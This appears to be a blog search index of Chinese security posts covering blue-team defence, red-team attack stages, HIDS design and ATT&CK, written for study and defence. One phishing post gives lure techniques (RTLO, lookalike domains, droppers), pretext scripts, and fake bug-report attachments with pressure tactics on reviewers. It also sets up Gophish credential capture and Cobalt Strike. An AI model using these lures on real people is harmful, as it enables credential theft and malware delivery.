<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[蓝队视角之防守经验总结]]></title>
    <url>%2Fposts%2F10906%2F</url>
    <content type="text"><![CDATA[蓝队(红军)是体系化安全建设方，应对高级威胁防御，本文总结攻防演练中蓝队防守思路、工具与方法... 0x01 体系化防守1. 预防预防是重点：通过对攻击面、攻击点和攻击方法进行梳理并进行加固，增加其攻击难度 1231）全面理清攻击面，清理外网泄露的敏感信息，对资产进行相关的测试和加固，以减少企业短板，阻敌于外2）基于零信任原则，增加攻击者在内网进行横向移动和权限提升等难度，从而降低攻击的整体成功率 2. 检测检测是基础：明晰内外部资产情况，通过各类检测设备、方法发现攻击痕迹，快速定位，为后续的响应和溯源提供信息和证据 3. 响应响应是重要阻敌手段：通过建立完善的应急响应流程，快速判断及处理未成功攻击，做到快速发现、定位分析、响应处置，将攻击者限定在最小范围 4. 溯源溯源是关键得分手段：利用技术手段还原攻击者攻击手法，定位身份 1231）通过攻击中暴露的IP/域名等信息，结合威胁情报及其他渠道，还原攻击画像，追溯到真人2）通过部署内外网蜜罐等手段，主动诱捕在进行信息搜集或企图入侵的攻击者 5. 反制发现并成功反制攻击者，控制攻击者主机及网络环境 0x02 蓝队得分场景 积极配合应急响应，根据线索快速准确定位受害系统，能提供充分的日志记录，配合执法机关取证并完成勘验攻击行为 发现漏洞攻击，记录完整的攻击路径，并触发相应的应急处置流程 处置webshell木马或主机木马程序，并触发相应的应急处置流程 处置主机异常新增账号，处置被爆破的账号密码，并触发相应的应急处置流程 处置Web系统、FTP等异常账号，处置被爆破的账号密码消除威胁 发现钓鱼攻击，快速定位钓鱼样本，并提交样本分析报告 发现社会工程攻击，上报攻击者有效个人信息(姓名、职位、电话、公司)等 发现并成功溯源攻击者，上报攻击者有效信息(IP、设备信息、个人信息等) 发现并成功反制攻击者，控制攻击者主机及网络环境 0x03 防护技战法1. 资产管理资产管理手段 12345678910111）互联网资产测绘与监测对互联网资产暴露面、敏感信息泄露、暴露的高危漏洞、端口和弱口令进行全面检测，提供应急响应漏洞通告，全面梳理互联网资产暴露风险2）资管管理安全产品借助资产安全管理平台、主机安全管理平台盘点资产3）人工盘点、追踪、核查与确认梳理网络拓扑图、防火墙配置、回收老旧资产、登记新资产等；对主要供应链进行梳理，如：VPN品牌、OA/邮件供应商、系统框架组件等 资产安全巡检 1234567891）互联网暴露面资产巡检2）互联网敏感信息泄露监控3）高危端口/弱口令周期扫描4）常见高危端口周期扫描5）应急漏洞响应通告 2. 溯源反制通过欺骗防御系统主动部署诱饵，诱敌深入，采集信息达到追踪溯源，最终反制 3. 内网威胁猎杀4. 自动化运营5. 攻击面收敛与网络隔离6. 零信任安全7. 扩大安全边界覆盖范围8. 主机安全防护9. 威胁情报10. 安全意识提升]]></content>
      <categories>
        <category>红蓝对抗</category>
      </categories>
      <tags>
        <tag>Blue Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红队视角之攻击姿势研究]]></title>
    <url>%2Fposts%2F33890%2F</url>
    <content type="text"><![CDATA[红队(蓝军)是攻击方，在实战化对抗中验证安全防护体系，本文从攻击者视角研究攻防演练中红队进攻击思路、姿势与技战术... 0x01 红队得分场景 获取域控服务器权限 获取路由器、防火墙、交换机等网络设备权限 获取Web应用系统服务器、邮件服务器、数据库服务器等权限 获取业务内网邮箱、FTP应用、Web应用系统、数据库远程访问、互联网VPN接入系统的账号密码 获取Webshell、终端计算机权限 获取其他关键账号及系统权限 0x02 攻击思路1. 主要资产正面突破1通常此路径系统漏洞相对较少，防护设备与安全措施更严密，攻击难度较大，易被察觉；但由于资产重要程度较高，突破后收益较大，或可长驱直入，迅速控制核心目标 2. 边缘资产迂回攻击1一般此处防御相对较弱，监控薄弱，攻击难度较小，但要进一步入侵核心层，往往需要多次横向和纵向扩展 3. 第三方侧面入侵1利用上下游公司、外包开发商等与企业的网络具备关联性的机构，攻击者可通过首先入侵这些第三方，再扩展到企业，达到侧面入侵的目的 4. 以人为突破口1针对安全意识薄弱的员工进行钓鱼等社会工程学攻击，可广泛撒网，也可以精准打击运维等具有管理权限的员工 5. 利用联网硬件进行入侵1攻击者通过联网的设备，利用网络互联、隔离较弱等防护脆弱点，实现对目标的迂回攻击 0x03 攻击流程1. 初始信息收集1攻击者搜集目标组织的人员信息、组织架构、网络资产、技术框架及安全措施信息 2. 制定攻击方案1对基础信息进行分析后，确定关键任务、关键系统、边缘资产、物理地址等信息，攻击成员分工分配攻击任务，方案包括：物理入侵、钓鱼邮件、Wi-Fi入侵、边缘资产渗透、互联网边界突破等 3. 初始打点1利用搜集到的信息、自动化攻击工具、漏洞储备资源、计算资源能力，通过利用安全意识漏洞、已知的漏洞或者0Day进行攻击，突破到内网区域 4. 内网立足1通过特定工具，利用初始入侵得到的突破口，建立好进入内网的通道，同时隐蔽防止被发现，能够稳定在内网立足 5. 权限提升1通过内核提权、服务缺陷及漏洞等手段，将攻击者权限进行提升，获取较高权限，方便进一步攻击行动 6. 内网信息搜集1利用新的立足点，进行内网信息搜集，包括内网网络结构、脆弱服务、用户账号密码等，为下一步行动做准备 7. 横向移动123结合之前搜集的信息。在通过特定的漏洞和工具进行横向移动，扩展到新的位置定向攻击核心目标，通过内网横向渗透，获取更多的服务器控制权限、管理员信息、重要系统账密等，如域控服务器、DevOps发布系统、Jenkins/Git/SVN代码仓库、堡垒机、跳板机、开发运维机、开发环境权限等 8. 权限维持1扩展到新位置后，利用工具维持攻击者的权限，使得能立足在内网新位置 9. 目标达成1通过持续的权限提升-内网信息收集-横向移动-维持权限循环，逐步逼近目标，最终完成目标 0x04 攻击技战法1. 线上+社工持续信息收集2. 边界突破，巧妙利用漏洞3. 自动化工具利用4. 虚拟机逃逸攻击5. 安全设备漏洞挖掘与利用6. 供应链攻击切入7. 邮件钓鱼与社工8. 攻陷VPN，长驱直入9. 隐蔽行踪，攻其不备0xFF 参考资源 《实战攻防-企业红蓝对抗实践指南》]]></content>
      <categories>
        <category>红蓝对抗</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[钓鱼邮件攻击技术研究]]></title>
    <url>%2Fposts%2F20001%2F</url>
    <content type="text"><![CDATA[钓鱼攻击(Phishing)是红队惯用的社工攻击方式之一，是APT的主要打点手段，针对安全意识薄弱人员进行钓鱼攻击，可轻松绕过各类安全防护设备。本文从实战角度对钓鱼邮件攻击思路、姿势、场景，进行研究总结… 0x01 攻击方式1. 恶意链接简介 LNK（快捷方式或符号链接）是引用其他文件或程序的方法；快捷方式修改的利用方式，在MITRE ATT@CK中的ID是T0123，攻击者可以使用这种方式来实现持久化 Tips (1) 用超链接,把元素内容改成想要仿冒的域名 (2) 申请一些和目标域名比较相似的域名 (3) IDN punycode转码域名注册 (4) https证书伪造: Let&apos;s Encrypt、Cloudlare等免费可信证书2. 文档攻击通过携带exe、execl、word等附件（附件中包含中恶意宏代码、远控exe）的方式 (1) 内嵌链接 在PDF、Office文档中内嵌一个跳转链接式，通过文字信息的引导，让受害者点开页面；Office、Adobe等应用软件对打开外部链接都会弹框进行安全提醒，这种方式也比较容易引起警觉 (2) Office宏 宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化；恶意宏代码在免杀和增加分析难度的手段上多种多样，除了把VBA代码混淆变形外，利用Excel的特性隐藏代码也很常见 (3) CHM文档 CHM是Windows帮助文件（如电子书）使用的扩展名，此文件可以被植入可执行代码，Cobalt Strike就支持CHM钓鱼文件的生成。成功的利用需要欺骗用户打开恶意的CHM文件，该文件可用于执行恶意代码。其缺点就是打开时会出现弹黑框、卡顿，容易被察觉 (4) 漏洞捆绑文档 利用Office、Adobe、IE等应用软件的漏洞，精心制作成诱饵文档，是APT攻击中的常客 (5) 文件后缀RTLO RTLO字符全名为“RIGHT-TO-LEFT OVERRIDE”，是一个不可显示的控制类字符，其本质是unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件 (6) HTA文件 HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限。Cobalt Strike也支持HTA钓鱼文件的生成 (7) ⾃解压 把⼀个恶意的⽂件和⼀个图⽚组合在⼀起，打包运⾏后，程序进⾏⾃解压，释放木马 (8) ⾃解压+RLO 把pe⽂件反转成png后缀、修改pe⽂件的ico图标，最后实施⾃解压操作0x02 场景案例1. 简历伪造投递Tips 1. 模拟真实简历投递：在简历钓⻥邮件中，可伪造名字、联系方式、学校、经历等信息，针对不同岗位(技术、运营、产品经历等)伪造合适的简历，尽量写的漂亮 2. 从官网招聘、领英、拉勾⽹、智联招聘、BOSS直聘、脉脉、v2ex、搜索引擎及其他专业论坛等渠道获取各平台留下简历投递的邮箱信息 3. 简历拥有分发属性，针对HR等安全意识薄弱人员，成功率比较高2. 邮件及网站伪造购买⼀个相似域名，编写⼀摸⼀样的登录⻚⾯，访问后做引导，告知让其登录更新；或者伪造邮件服务器，发送全员及针对性邮件，诱导其点击查看邮件附件 话术总结 1. 邮箱账号被异常登录、公司邮箱密码泄漏，账号密码过期，提醒修改更新密码 2. 公司福利活动，请登录指定页面下载领取 3. 最新爆发的漏洞通告及大型安全演练漏洞修复，请打漏洞补丁 4. 系统更新迁移，云服务器包年包月过期，影响服务器列表见邮件附件 5. 内部技术交流分享，请点击直播链接、附件PPT观看 6. 转正评估、绩效自评及评估结果查看，请点击指定页面进行操作 7. 构造钓鱼二维码，诱导员工扫描钓鱼二维码，跳转至指定钓鱼页面3. SRC假漏洞当⽬标企业存在类似SRC漏洞奖励计划时，可以去提交⼀个假漏洞，把恶意⽂件附在其中，并说是漏洞复现程序，诱导SRC审核人员打开 Tips 1. 最好伪造提交核⼼应⽤高危及严重漏洞，保证“漏洞”的有效性及真实性 2. 当SRC审核⼈员迟迟不点击的时候，可以施加压力，如指出漏洞危害高且影响范围广，若不及时修复承担责任；“指责”SRC人员漏洞审核水平及流程有待提升，审核时间较慢，对安全重视程度低等；其他家SRC流程如何规范、审核时效性如何高等等对比0x03 平台搭建1. 环境/工具a. VPSVPS(邮件服务器/钓鱼平台//CS Server)，推荐购买国外VPS，按时付费；(国内厂商监管严格、限制较多、whois信息易泄露、SMTP 端口限制) b. 域名购买与目标公司邮箱相近的域名 c. 邮件服务器方案一：开源自建邮件服务器 - EwoMail Ewomail介绍 123456789101. 基于Linux的开源邮件服务器软件，集成了一些稳定的组件，可快速搭建，集成组件如下： Postfix：邮件服务器 Dovecot：IMAP/POP3/邮件存储 Amavisd：反垃圾和反病毒 LNMP：nginx,mysql,php EwoMail-Admin：WEB邮箱管理后台 Rainloop：webmail2. 数据可单独存储在个人服务器，防止隐私被盗取，保护数据安全 使用体验 123451. 搭建方便，配置简单，采用自建邮件服务器方案较为推荐2. VPS一般会封禁25端口，需选择小众VPS厂商自建邮件服务器，或向客服申请25端口开放；对外发送邮件较麻烦3. 自建邮件服务器发送邮件容易被识别为垃圾邮件，即使配置SPF、DKIM也存在被当成垃圾邮件的情况；维护相对较麻烦 方案二：专业电子邮件托管服务 - Zoho Mail 使用体验 12345671. 基本可以避免被识别为垃圾邮件的情况2. 配置及维护方便，可避免自建邮件服务器带来的一系列问题3. 对外发送邮件基本不存在问题，SMTP默认使用465/587端口，加密传输邮件，安全性较高4. 实际使用中，与gophish钓鱼平台联动效果较好，基本不需要投入过多时间配置 refer： https://www.10besty.com/best-email-hosting-providers/#two d. 钓鱼平台Gophish 1Gophish is a powerful, open-source phishing framework that makes it easy to test your organization&apos;s exposure to phishing e. 红队平台Cobalt Strike 1一款优秀的红队攻击平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动；本文主要用此制作钓鱼诱饵、载荷投递及远控，CS的Spear Phish模块也可进行钓鱼测试 2. 邮件服务器a. Ewomail参考EwoMail 邮件服务器(开源版文档)进行邮件服务器的搭建 邮件基础 简称 全名 任务 MUA Mail User Agent 供用户写信、读信、寄信的软件。寄信时，以SMTP协议将邮件提交给MTA ；收信时 ，以POP或IMAP协议访问服务器上的邮箱 MTA Mail Transfer Agent 负责接收、递送邮件的服务器软件。决定邮件的递送路径，进行必要的地址改写。应该由本地系统收下的邮件，委托给MDA进行最后的投递操作 MDA Mail Delivery Agent 负责投递本地邮件到适当的邮箱，MDA可以过滤邮件内容，或是依照用户设定的准则，将邮件分类到适当的邮箱；甚至可以将邮件转回给MTA，以寄到另一个邮箱 注意事项 1234567891. 服务器VPS需要干净环境，要求全新干净系统，最好单独供Ewomail使用，不能安装在已有的nginx,mysql的环境中2. 新版本的杀毒软件占用的内存比较多，可参考(http://doc.ewomail.com/docs/ewomail/reduce_memory)降低内存占用3. webmail https证书配置：系统自带了本地SSL证书，但未经认证；可使用经互联网经认证的证书，如通过 Let’s Encrypt、Cloudlare等申请免费可信证书4. 开放端口：必须打开的端口8000(webmail)，8010(管理后台)，25(SMTP)，143(IMAP)；可修改5. DKIM设置：推荐设置域名密钥识别邮件标准，用来防止被判定为垃圾邮件；参考(http://doc.ewomail.com/docs/ewomail/dkim) 问题总结 12345678910111. 无法连接服务器：邮件无法发送、接收等a. 检查VPS服务商是否开放25端口出站方向，如未开放可通过工单、客服等联系运营商申请开放25端口出站方向；或使用465等其他端口发送邮件b. 25端口正常的情况下，如果不能链接服务器，请检查域名DNS解析，或做内部通信2. 域不允许a. 当显示域不允许的时候，先检查域名解析是否已做好，如果只在本地搭建测试，测试内部通信是否正常 b. 如以上2个步骤还不行，参考自定义访问路径文章(http://doc.ewomail.com/docs/ewomail/custom_path)，填上具体的访问地址 配置/命令 123456789101112131415161718192021222324252627282930313233343536373839404142431. 默认安装及配置目录/ewomail.├── config.ini├── dkim├── mail├── mysql├── nginx├── php72└── www2. 管理后台、webmail的nginx配置/ewomail/nginx/conf/vhost├── ewomail-admin.conf //管理后台├── phpmyadmin.conf //数据库├── rainloop.conf //webmail└── rainloop.conf.ssl //webmail ssl配置3. PHP配置文件: 可修改后台管理或webmail的访问路径/ewomail/www/ewomail-admin/core/config.php ├── &apos;url&apos; =&gt; &apos;ewomail后台访问路径&apos;└── &apos;webmail_url&apos; =&gt; &apos;webmail的访问路径&apos;4. 卸载命令$ systemctl stop nginx php-fpm mysqld postfix dovecot amavisd$ rm -rf /ewomail5. 重启命令$ systemctl restart nginx php-fpm mysqld postfix dovecot amavisd6. 组件查找$ yum install mlocate &amp;&amp; updatedb // 安装locate所在文件包并更新搜索数据库 $ locate amavisd //查找邮件内容过滤器amavised相关文件/文件夹 管理后台 Webmail b. Zoho Mail参考官方文档 Email Hosting Setup in Zoho 进行申请、配置；配置完成后如下： SMTP服务配置可参考 SMTP Server Configuration - Zoho Mail，完成后在gophish中进行Sending Profiles-邮箱配置 采用此方案，对外发送邮件基本没什么问题，也不用担心被识别为垃圾邮件 3. 钓鱼平台安装运行 1234567891011121314151617181920211. 下载解压$ wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip$ unzip gophish-v0.11.0-linux-64bit.zip -d gophish2. 修改配置(config.json)admin_server是后台管理页面，将127.0.0.1 改为 0.0.0.0，默认开放的端口3333。phish_server是钓鱼网站，默认开放80端口3. 启动运行$ cd gophish &amp;&amp; chmod 640 config.json &amp;&amp; chmod +x gophish$ nohup ./gophish &amp; //后台运行，日志记录至nohup.out文件成功启动后，在nohup.out文件中的初始账户密码可用来登录控制台4. 首次登录强制修改密码，要求八位以上字符地址：https://x.x.x.x:3333/ 功能介绍 功能 简述 Dashboard 仪表板，查看整体钓鱼情况 Campaigns 作战配置，每次攻击前需要配置一次 Users &amp; Groups 用户和用户组（添加需要进行钓鱼的邮箱和相关信息） Email Templates 电子邮件模板 Landing Pages 需要伪造的钓鱼页面 Sending Profiles 钓鱼邮箱发送配置 Account Settings 账户、UI、报告等设置 4. CS 平台搭建及使用可参考A-Team: Cobalt Strike 4.0 手册及Cobalt Strike Book 目录简介 123456789101112131415161718192021➜ CobaltStrike4.1 tree -L 1.├── agscript //[拓展应用的脚本]├── agscript.bat├── c2lint //[检查c2配置文件语法和预览]├── c2lint.bat├── cobaltstrike //[客户端启动程序]├── cobaltstrike.auth├── cobaltstrike.bat //[CS Windows客户端启动程序]├── CobaltStrikeCN.jar //[翻译插件]├── cobaltstrike.jar //[主体程序]├── cobaltstrike.store├── data├── logs├── nohup.out //[后台启动日志记录]-个人创建├── peclone├── peclone.bat├── start.sh //[服务端后台启动脚本] -个人创建├── teamserver //[Linux服务端启动程序]├── teamserver.bat└── third-party //[vnc远程功能的dll等第三方工具] 启动运行 12345671. Cobalt Strike 团队服务器建议在VPS Linux 系统上运行，可持久运行，连接便捷$ nohup sh start.sh &amp; //后台启动，日志记录至nohup.out启动脚本start.sh：teamserver &lt;server_host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]2. 客户端选用Windows：运行teamserver.bat启动，输入服务端启动时配置的server_host、password即可 0x04 钓鱼实战1根据搭建的钓鱼平台、制定的钓鱼方案，选取个人及同事通用邮箱、内部邮箱进行测试；针对全体员工的钓鱼测试修改收件人邮箱账号即可，原理及方法类似；本测试选取邮箱账户密码更新钓鱼场景，其余场景过程类似 1. 创建邮件用户/组可通过上传CVS文件，进行批量添加邮件账号，批量发送邮件 测试选取了两个外部邮件服务商邮件账号、一个内部邮件账号 2. 钓鱼邮件模板需在钓鱼邮件模板中的html进行更改和添加，可统计哪些人点开了钓鱼邮件，哪些人打开了钓鱼页面 为了后续记录邮件是否打开，可勾选上AddTrackingImage，它将会在发送的每份邮件源码上插入一个唯一特定的隐藏图片，当邮件被打开时，此隐藏图片则也会被请求，以此来检测该邮件是否被打开，AddFiles则是给邮件添加附件3. 伪造钓鱼页面配置好钓鱼邮件后，可以通过LandingPages模块来新建钓鱼网站页面，支持手写 html文件，也可通过导入网站功能，针对目标网页进行克隆; 如以下抓取内部网页邮箱登录界面： 1231. 选上CaptureSubmitted Data和CapturePasswords，记录受害者输入的账号和密码，为安全性，暂不选取密码记录2. Redirect to 是受害者点击完提交按钮后，自动跳转的网站 4. 发起钓鱼攻击配置Campaigns，填写Name、选择钓鱼邮件模板、选择钓鱼网站模板、填写钓鱼网站 URL、填写发件邮箱、选择受害者邮件组 1钓鱼网站URL根据实际钓鱼邮件测试情况，填写对应的地址，点击Launch Campaign即可成功发起一次钓鱼邮件攻击测试 5. 仪表板查看实际测试中，选取了三个邮件账号，一个未打开邮件、一个打开邮件并点击链接、一个打开邮件后点击链接并输入登录账号密码，最终结果如下，和测试结果相同： 1通过仪表盘可详细看到那些邮件账户打开了邮件、点击了指定链接、并输入了账户和密码信息；钓鱼链接对主机无危害、仅显示那些账号对其进行了访问 本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
        <tag>Phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大型分布式HIDS建设总结]]></title>
    <url>%2Fposts%2F11235%2F</url>
    <content type="text"><![CDATA[本文总结大型分布式HIDS自研建设的一些经验及研究心得，持续更新中... 0x01 核心能力1. 数据采集能力Agent端做深入的数据采集(采集深度、数据上下文丰富度)，提高对抗成本 1）内核态、用户态系统数据 2）容器层数据：Docker、Kubernetes 3）通用服务组件数据及日志：数据库、Web服务器、大数据组件、中间件、开发软件等2. 检测分析能力能检测到什么程度的攻击(一般入侵 —&gt; 渗透测试 —&gt; 红队演练 —&gt; APT) 核心能力 1231. 入侵对抗：基于网络攻杀链、ATT &amp; CK模型等各个阶段的攻击战术、技术、过程检测与响应2. 数据分析：基于特征(IOCs库、TTPs库)、图计算、入侵链路可视化分析、用户和实体行为分析、威胁智能分析、模型智能编排 0x02 考虑因素1. 安全性1234567891011(1) Agent跟Server的配置下发通道安全，数据传输加密(2) 配置信息读取写入需要鉴权、配置变更历史需记录(3) 不预留包含任何命令执行的功能，服务端操作下发严格鉴权，保证agent低侵入性(4) agent更新时，对升级包的完整性进行检测验证，防止被攻击者替换(5) 通过system服务自启动、watch守护进程逆行监控，对异常agent下线进行监控和告警(6) Agent反调试、防逆向手段，提升攻击者对agent逆向分析难度 2. 低损耗1节省资源，占用较少的CPU、内存；可使用cgroup等严格限制资源占用 3. 稳定性1需保证agent长期运行稳定，确保agent本身不影响正常服务及业务 3. 高可用12345(1) 需满足数十万服务器量级的IDC规模(2) 进程包活、心跳检测、实时获取新指令能力(3) 支持分布式部署，并行处理任务，保证数据的一致性，服务器数量规模达到百万级的集群负载能力 4. 可控性123(1) 精确的熔断限流，服务端命令下发响应需控制在分钟级以内(2) 服务端能控制agent的启动、终止，当agent出现异常时，也许保证可控 5. 部署兼容性1需满足广泛的部署兼容性、兼容Linux各种版本、支持容器环境等 6. 可扩展性1系统功能增加、版本更新及维护较为方便，满足可扩展性 0x03 数据采集1. 采集维度依据安全需求、等保合规、威胁检测模型等梳理HIDS需要采集的数据维度、数据项… 2. 技术方案总结业界成熟的主机入侵检测技术方案、开源项目核心模块… (1) eBPF eBPF Linux内核提供的一种扩展的BPF虚拟机，可用于获取内核运行信息 Seccomp BPF 使用BPF程序对任意系统调用及其参数进行过滤 bpftrace eBPF的高级跟踪语言，可实现内核动态跟踪（kprobes）,用户级动态跟踪（uprobes） (2) Audit linux-audit Linux安全审计系统，可用于收集记录系统、内核、用户进程发生的行为事件 go-audit Go实现的Linux audit类库，可替代auditd daemon go-libaudit go-libaudit是用于与Linux Audit Framework通信的库 (4) sysdig sysdig 提供深层系统可见性的工具，可对容器进行访问 (5) Capsule8 capsule8 Linux系统及云环境实时威胁检测防护开源项目 (6) Osquery-events osquery-events Osquery事件监控模块，可持续监控系统事件变化情况 (7)elastic-auditbeat auditbeat 用于收集Linux审计框架数据，对消息进行解析和标准化，并监测文件的完整性 (8) grsecurity grsecurity 一个用于Linux内核的修补程序，为ACL系统提供了内核模块的支持 (9) snoopy snoopy 开源的轻量级lib库, 可以记录系统中所有执行过的命令和参数 (10) inotify-tools inotify-tools Linux文件系统事件监控工具套件 (11) Rootkit Detection tyton Linux内核态rootkit检测工具 LKRG Linux内核运行时防护工具 Unhide 可用于检测隐藏进程 rkhunter Linux用户态rootkit检测工具 0x04 检测分析1. 检测模型 Refer: https://help.aliyun.com/document_detail/191144.html 2. 检测方法a. 误用检测方法12345678910111) 模式匹配法通过把收集到的信息与网络入侵和系统误用模式数据库中的已知信息进行比较，从而对违背安全策略的行为进行发现。模式匹配法可以显著地减少系统负担，有较高的检测率和准确率2) 专家系统法通过将安全专家的知识表示成IF-THEN规则，形成专家知识库，然后，运用推理算法进行检测入侵。专家系统的IF-THEN规则，就是由模式匹配规则组成，即”与或非组合模式匹配规则“，通过组合多个模式匹配规则，来获得单个模式匹配规则所无法取得的效果，主要是针对有特征的入侵行为3) 状态转移分析法该方法的基本思想是将攻击看成一个连续的、分步骤的并且各个步骤之间有一定的关联的过程。在网络中发生入侵时及时阻断入侵行为，防止可能还会进一步发生的类似攻击行为。在状态转移分析方法中，一个渗透过程可以看作是由攻击者做出的一系列的行为而导致系统从某个初始状态变为最终某个被危害的状态 b. 异常检测方法12345678910111213141516171819202122232425262728293031323334351) 基于贝叶斯推理检测法通过在任何给定的时刻，测量变量值，推理判断系统是否发生入侵事件2) 基于特征选择检测法指从一组度量中挑选出能检测入侵的度量，用它来对入侵行为进行预测或分类3) 基于贝叶斯网络检测法用图形方式表示随机变量之间的关系。通过指定的与邻接节点相关一个小的概率集来计算随机变量的联接概率分布。按给定全部节点组合，所有根节点的先验概率和非根节点概率构成这个集。贝叶斯网络是一个有向图，弧表示父、子结点之间的依赖关系。当随机变量的值变为已知时，就允许将它吸收为证据，为其他的剩余随机变量条件值判断提供计算框架4) 基于模式预测的检测法事件序列不是随机发生的而是遵循某种可辨别的模式是基于模式预测的异常检测法的假设条件，其特点是事件序列及相互联系被考虑到了，只关心少数相关安全事件是该检测法的最大优点5) 基于统计的异常检测法根据用户对象的活动为每个用户都建立一个特征轮廓表，通过对当前特征与以前已经建立的特征进行比较，来判断当前行为的异常性。用户特征轮廓表要根据审计记录情况不断更新，其保护去多衡量指标，这些指标值要根据经验值或一段时间内的统计而得到6) 基于机器学习检测法根据离散数据临时序列学习获得网络、系统和个体的行为特征，并提出了一个实例学习法IBL，IBL是基于相似度，该方法通过新的序列相似度计算将原始数据（如离散事件流和无序的记录）转化成可度量的空间。然后，应用IBL学习技术和一种新的基于序列的分类方法，发现异常类型事件，从而检测入侵行为。其中，成员分类的概率由阈值的选取来决定7) 数据挖掘检测法数据挖掘的目的是要从海量的数据中提取出有用的数据信息。网络中会有大量的审计记录存在，审计记录大多都是以文件形式存放的。如果靠手工方法来发现记录中的异常现象是远远不够的，所以将数据挖掘技术应用于入侵检测中，可以从审计数据中提取有用的知识，然后用这些知识区检测异常入侵和已知的入侵。采用的方法有KDD算法，其优点是善于处理大量数据的能力与数据关联分析的能力，但是实时性较差8) 基于应用模式的异常检测法该方法是根据服务请求类型、服务请求长度、服务请求包大小分布计算网络服务的异常值。通过实时计算的异常值和所训练的阈值比较，从而发现异常行为9) 基于文本分类的异常检测法该方法是将系统产生的进程调用集合转换为“文档”。利用K邻聚类文本分类算法，计算文档的相似性 3. 特征库 https://osintframework.com/ https://github.com/swisskyrepo/PayloadsAllTheThings https://github.com/mitre-attack/attack-navigator https://virustotal.github.io/yara/ APT_CyberCriminal_Campagin_Collections https://github.com/smicallef/spiderfoot https://github.com/InQuest/awesome-yara https://github.com/sroberts/awesome-iocs https://github.com/KasperskyLab/klara]]></content>
      <categories>
        <category>威胁检测</category>
      </categories>
      <tags>
        <tag>Threat Detection</tag>
        <tag>HIDS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻击视角之网络威胁框架演进]]></title>
    <url>%2Fposts%2F20996%2F</url>
    <content type="text"><![CDATA[本文从攻击视角研究洛克希德-马丁Cyber Kill Chain、NSA-TCTF框架、MITRE-ATT&CK框架等网络威胁框架... 0x01 Cyber Kill Chain 检测防御 0x02 NSA-TCTF框架NSA-TCTF框架(Technical Cyber Threat Framework，技术性网空威胁框架): NSA于2018年提出的TCTF框架，对攻击意图、作业阶段、行动特征的拆解与刻画 0x03 ATT&amp;CK框架MITRE-ATT&amp;CK框架 (Common Knowledge base of Adversary Tactics and Techniques，对手战术技术公共知识库): 从现实网络威胁中提炼出攻击行动的具体信息，构造了丰富的攻击者战术技术知识库 攻击阶段 对应英文 描述 检测项 1. 初始访问 Initial Access 通过各种漏洞、攻击入口进入网络 暴力破解、异常登录、web攻击、服务漏洞、未授权访问、配置缺陷，钓鱼、供应链攻击、可信账户登录 2. 投递执行 Execution 恶意代码、软件投递并执行 主动非法外连、恶意软件落盘、可疑文件传输、异常脚本及指令执行，用户恶意链接、文档执行 3. 持久化控制 Persistence 持久化，保持立足点 可疑定时任务、异常启动项，webshell、rootkit、反弹shell、可疑账户创建、各类持久化后门 4. 权限提升 Privilege Escalation 获取更高级别权限 内核、系统、服务组件提权，漏洞利用程序，进程注入，LD_PRELOAD劫持，容器提权及逃逸 5. 防御规避 Defense Evasion 杀软、检测设备绕过，避免被发现 文件编码、混淆，文件、进程隐藏，安全设备禁用修改，系统文件、命令替换，预加载文件篡改，agent异常离线，日志及历史命令清除，有效账户利用，进程注入 6. 凭证访问 Credential Access 窃取账户和密码 输入记录，密码喷洒攻击，中间人攻击，修改身份验证过程，网络嗅探，系统凭证转储，登录凭证抓取 7. 环境发现 Discovery 所处系统及内部网络环境发现，便于进一步横向渗透 内网信息收集，账号发现、文件目录发现、网络服务扫描、共享服务发现、网络嗅探、权限发现、服务组件及安全软件发现、虚拟化/沙盒环境发现 8. 横向移动 Lateral Movement 当前环境穿越，多个目标访问 内网扫描、端口转发、远程服务利用、远程服务会话劫持、蠕虫病毒、横向工具转移、软件部署工具 9. 数据采集 Collection 目标数据收集 存档数据、剪贴板、数据库、网络共享等数据收集，数据分段暂存及传输，输入捕捉，中间人攻击 10. 命令与控制 Command and Control 与目标系统持续通信与控制 远控木马、异常连接、数据编码及混淆、加密通道、协议隧道、多跳代理、域前置、DGA域名 11. 数据窃取 Exfiltration 目标数据窃取 敏感文件访问及泄漏、数据库导出，通过C2通道、网络及物理介制窃取数据，代码存储库窃取、云存储迁移，可信账号劫持及利用 12. 影响破坏 Impact 操纵、中断或破坏系统和数据 数据销毁、加密、损坏，账户访问权限删除，拒绝服务，磁盘擦除，服务停止等 0xFF 参考资源 Gaining_the_Advantage_Cyber_Kill_Chain Seven_Ways_to_Apply_the_Cyber_Kill_Chain_with_a_Threat_Intelligence_Platform LM-White-Paper-Defendable-Architectures LM-White-Paper-Threat-Driven-Approach CTR_NSA-CSS-TECHNICAL-CYBER-THREAT-FRAMEWORK_V2 https://attack.mitre.org/matrices/enterprise/linux/ https://attack.mitre.org/tactics/enterprise/ https://attack.mitre.org/mitigations/enterprise/ Gaining_the_Advantage_Cyber_Kill_Chain.pdf]]></content>
      <categories>
        <category>威胁检测</category>
      </categories>
      <tags>
        <tag>Threat Framework</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统及服务安全加固手册]]></title>
    <url>%2Fposts%2F98821%2F</url>
